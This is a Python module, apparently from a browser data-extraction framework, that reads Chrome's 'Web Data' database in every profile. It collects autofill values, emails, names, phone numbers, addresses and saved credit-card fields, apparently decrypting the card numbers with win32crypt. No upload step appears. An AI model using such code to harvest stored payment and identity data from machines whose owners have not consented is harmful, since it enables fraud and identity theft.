# coding: utf-8

try:
	import os
	import sqlite3
	import win32crypt
except ImportError:
	pass

from modules.windows.chrome.chrome_module import ChromeModule
from internal import data_type
from api.windows import format


class WindowsChromeSavedData(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='WindowsChromeSavedData',
			version='0.1.1',
			file=__file__,
			dependencies=['os', 'sqlite3', 'win32crypt'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():

			self.cursor_getV2(
				path=profile + '/Web Data',
				items=[
					[data_type.Text, 'name'],
					[data_type.Text, 'value'],
				],
				db='autofill',
				spe='autofill.' + os.path.split(profile)[1],
			)

			self.cursor_getV2(
				path=profile + '/Web Data',
				items=[
					[data_type.Email, 'email'],
				],
				db='autofill_profile_emails',
				spe='autofill_profile_emails.' + os.path.split(profile)[1],
			)

			self.cursor_getV2(
				path=profile + '/Web Data',
				items=[
					[data_type.Name, ('first_name', 'last_name')],
				],
				db='autofill_profile_names',
				spe='autofill_profile_names.' + os.path.split(profile)[1],
			)

			self.cursor_getV2(
				path=profile + '/Web Data',
				items=[
					[data_type.PhoneNumber, 'number'],
				],
				db='autofill_profile_phones',
				spe='autofill_profile_phones.' + os.path.split(profile)[1],
			)

			self.cursor_getV2(
				path=profile + '/Web Data',
				items=[
					[data_type.Address, ('street_address', 'zipcode', 'country_code')],
				],
				db='autofill_profiles',
				spe='autofill_profiles.' + os.path.split(profile)[1],
			)

			self.cursor_getV2(
				path=profile + '/Web Data',
				items=[
					[data_type.CreditCard, ('card_number_encrypted', 'name_on_card', 'expiration_month', 'expiration_year'), format, [0]],
				],
				db='credit_cards',
				spe='credit_cards.' + os.path.split(profile)[1],
			)

		return True
